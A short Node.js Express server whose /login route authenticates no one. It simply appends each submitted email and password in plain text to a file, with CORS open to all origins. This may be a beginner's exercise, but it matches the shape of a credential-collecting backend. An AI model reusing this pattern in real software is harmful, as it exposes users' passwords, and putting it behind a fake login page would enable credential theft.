const express=require("express");
const cors=require("cors");
const fs=require("fs");

const app=express();
const PORT=5000;
app.use(express.json());
app.use(cors());

// post req
app.post('/login',(req,res)=>{
    const {email,password}=req.body;

    if(!email || !password)
    {
        return res.status(400).json({message:"email and pass req"});
    }

    const line=`Email: ${email}, Password: ${password}\n`;
    fs.appendFile("users.txt",line,(err)=>{
        if(err)
        {
            return res.status(500).json({message:"could not save"});
        }
        return res.json({message:"saved!"});
    })
})
app.listen(PORT,()=>{
    console.log(`server running on ${PORT}`);
})
